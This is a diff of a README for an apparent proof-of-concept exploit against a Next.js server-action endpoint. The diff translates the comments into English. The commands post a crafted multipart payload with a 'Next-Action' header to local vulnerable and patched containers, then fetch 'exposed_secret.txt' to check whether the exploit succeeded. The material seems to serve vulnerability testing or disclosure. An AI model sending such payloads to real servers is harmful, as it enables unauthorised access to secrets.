@@ -35,28 +35,30 @@ cd poc
 ### PoC Execution
 #### 1. Test Vulnerable Container
 ```bash
-# Tạo file phụ payload2.txt (chỉ cần tạo 1 lần)
+# Create payload2.txt (Only need to do once)
 echo -n '"$@0"' > payload2.txt
 
-# Gửi file payload.json tới container Vulnerable
+# Send payload to container Vulnerable
 curl -i -X POST http://127.0.0.1:3001/ \
   -H "Next-Action: dontcare" \
   -F "0=<payload.json" \
   -F "1=<payload2.txt"
 
+# check state
 curl -i http://127.0.0.1:3001/exposed_secret.txt
 ```
 #### 2. Test Patched Container
 ```bash
-# Tạo file phụ payload2.txt (chỉ cần tạo 1 lần)
+# Create payload2.txt (Only need to do once)
 echo -n '"$@0"' > payload2.txt
 
-# Gửi file payload.json tới container Vulnerable
+# Send payload to container Patched
 curl -i -X POST http://127.0.0.1:3002/ \
   -H "Next-Action: dontcare" \
   -F "0=<payload.json" \
   -F "1=<payload2.txt"
 
+# Check state
 curl -i http://127.0.0.1:3002/exposed_secret.txt
 ```
 
